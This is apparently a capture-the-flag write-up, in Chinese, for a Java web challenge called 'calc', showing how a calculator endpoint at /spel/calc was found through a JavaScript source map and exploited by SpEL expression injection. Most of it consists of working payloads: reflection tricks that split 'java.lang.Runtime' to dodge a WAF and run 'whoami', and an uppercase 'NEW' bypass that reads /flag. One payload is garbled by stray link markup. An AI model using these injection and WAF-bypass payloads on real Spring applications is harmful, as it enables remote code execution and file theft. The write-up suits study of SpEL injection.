# calc

Working: Z xiao, Y1ng LM
状态: Done ✨
类型: Web

Java，有WAF

在[http://106.52.164.141/static/js/app.2bd6d7502a3d35617193.js](http://106.52.164.141/static/js/app.2bd6d7502a3d35617193.js) 里发现：

```python
//# sourceMappingURL=app.2bd6d7502a3d35617193.js.map
```

这个map中保存了目录的结构

static/js/app.2bd6d7502a3d35617193.js中发现了计算器的地址：

```python
R.default.get("/spel/calc",{params:{calc:t.enter}})
```

[http://106.52.164.141/spel/calc?calc=](http://106.52.164.141/spel/calc?calc=)

根据报错可以发现是spel

之后就是spel注入导致RCE 这里就是RCE点，fuzz一下waf主要过滤了：

- string
- new
- getclass
- java.lang

可以绕过，比如这个payload：

```python
''.class.forName('jav'+'a.lang.R'+'untime').getDeclaredMethods()[15].invoke(''.class.forName('jav'+'a.lan'+'[g.Ru](http://g.ru/)'+'ntime').getDeclaredMethods()[7].invoke(null),'whoami')
```

但是执行系统命令失败了：

```python
blocked by openrasp
```

应该是让文件读取， 但是找了一宿也没找到能用的文件读取的类和方法

做了一宿，终于在早上发现了bypass的方法,虽然new被ban了，但是可以用NEW绕过，这样就可以随意的构造类对象了；然后就是要把对应的包也写上，写全了就可以构造对象，不然会报错

最终payload为：

```python
NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()
```

url编码后访问/spel/calc?calc=payload 即可得到flag：

[http://106.52.164.141/spel/calc?calc=NEW java.util.Scanner](http://106.52.164.141/spel/calc?calc=NEW%20java.util.Scanner(NEW%20java.io.FileReader('/flag')).next()
payload也可用NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()
''.class.forName('java.nio.file.Files').getDeclaredMethods()[17].invoke(null,''.class.forName('java.nio.file.Paths').getDeclaredMethods()[0].invoke(null,'/flag',''.class.forName('jav'+'a.lang.'+'Str'+'ing').getDeclaredMethods()[63].invoke('','a')))